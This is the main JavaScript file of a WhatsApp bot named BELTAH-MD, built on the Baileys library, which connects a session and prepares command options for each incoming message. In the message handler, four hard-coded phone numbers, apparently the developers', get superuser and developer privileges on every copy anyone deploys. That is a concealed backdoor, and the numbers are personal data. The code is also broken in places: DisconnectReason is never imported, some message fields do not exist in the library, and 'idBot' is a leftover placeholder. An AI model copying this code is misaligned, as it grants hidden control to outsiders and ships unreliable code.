"use strict";

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  delay,
  jidDecode,
  downloadContentFromMessage,
} = require("@whiskeysockets/baileys");

const {
  getAllSudoNumbers
} = require("./bdd/sudo");

const pino = require("pino");
const axios = require("axios");
const fs = require("fs-extra");
const path = require("path");
const conf = require("./set");
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
require("dotenv").config({ path: "./config.env" });

const logger = pino({ level: "info" });

async function setupSession() {
  try {
    const session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
    const authPath = path.join(__dirname, "auth", "creds.json");
    if (!fs.existsSync(authPath)) {
      await fs.writeFileSync(authPath, Buffer.from(session, "base64").toString("utf8"));
    }
  } catch (e) {
    logger.error("Session Error:", e);
  }
}

async function main() {
  await setupSession();

  const store = makeInMemoryStore({
    logger: pino({ level: "silent" }),
  });

  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "auth"));
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    auth: state,
    browser: ["BELTAH-MD", "Safari", "1.0.0"],
    markOnlineOnConnect: false,
    syncFullHistory: true,
    generateHighQualityLinkPreview: true,
  });

  store.bind(sock.ev);

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "connecting") {
      logger.info("Connecting...");
    } else if (connection === "open") {
      logger.info("Sessions Connected successfully!");
    } else if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        logger.warn("Logged out. Please reconnect.");
      } else {
        logger.warn("Connection closed. Reconnecting...");
        main();
      }
    }
  });

  sock.ev.on("messages.upsert", async (msg) => {
    const ms = msg.messages[0];
    const origineMessage = ms.key.remoteJid;
    const auteurMessage = ms.key.participant || origineMessage;

    const nomAuteurMessage = ms.pushName;
    const sudo = await getAllSudoNumbers();
    const superUserNumbers = [conf.NUMERO_OWNER, "254737681758", "254114141192", "254738625827", "254759328581"]
      .map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
    const allAllowedNumbers = superUserNumbers.concat(sudo);
    const superUser = allAllowedNumbers.includes(auteurMessage);
    const dev = ["254114141192", "254737681758", "254759328581", "254738625827"]
      .map((t) => t.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(auteurMessage);

    function repondre(mes) {
      sock.sendMessage(origineMessage, { text: mes }, { quoted: ms });
    }

    console.log("\t [][]...{Beltah-Md}...[][]");
    console.log("=========== New message ===========");
    if (ms.key.remoteJid.endsWith("@g.us")) {
      const nomGroupe = ""; // Replace with group name logic if required
      console.log("Message sent from: " + nomGroupe);
    }
    console.log(
      "Message from: [" +
        nomAuteurMessage +
        " : " +
        auteurMessage.split("@s.whatsapp.net")[0] +
        " ]"
    );
    console.log("Type of message: " + ms.messageType);
    console.log("------ End of your message ------");
    console.log(ms.text);

    const etat = conf.ETAT;
    if (etat == 1) {
      await sock.sendPresenceUpdate("available", origineMessage);
    } else if (etat == 2) {
      await sock.sendPresenceUpdate("composing", origineMessage);
    } else if (etat == 3) {
      await sock.sendPresenceUpdate("recording", origineMessage);
    } else {
      await sock.sendPresenceUpdate("unavailable", origineMessage);
    }

    function groupeAdmin(membreGroupe) {
      let admin = [];
      for (let m of membreGroupe) {
        if (m.admin == null) {
          continue;
        }
        admin.push(m.id);
      }
      return admin;
    }

    const mbre = ms.key.remoteJid.endsWith("@g.us")
      ? await sock.groupMetadata(origineMessage).then(({ participants }) => participants)
      : "";
    let admins = ms.key.remoteJid.endsWith("@g.us") ? groupeAdmin(mbre) : "";
    const verifAdmin = ms.key.remoteJid.endsWith("@g.us")
      ? admins.includes(auteurMessage)
      : false;

    const verifZokouAdmin = ms.key.remoteJid.endsWith("@g.us")
      ? admins.includes("idBot") // Replace 'idBot' with bot's actual ID
      : false;

    const texte = ms.text || "";
    const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
    const verifCom = texte ? texte.startsWith(conf.PREFIXE) : false;
    const com = verifCom
      ? texte.slice(conf.PREFIXE.length).trim().split(/ +/).shift().toLowerCase()
      : false;
    const lien = conf.URL.split(",");

    function mybotpic() {
      const indiceAleatoire = Math.floor(Math.random() * lien.length);
      return lien[indiceAleatoire];
    }

    const commandeOptions = {
      superUser,
      dev,
      verifGroupe: ms.key.remoteJid.endsWith("@g.us"),
      mbre,
      verifAdmin,
      nomGroupe: "",
      auteurMessage,
      nomAuteurMessage,
      idBot: "idBot", // Replace 'idBot' with bot's actual ID
      verifZokouAdmin,
      prefixe: conf.PREFIXE,
      arg,
      repondre,
      mybotpic
    };

    if (origineMessage === "120363244435092946@g.us") {
      return;
    }
  });
}

main();
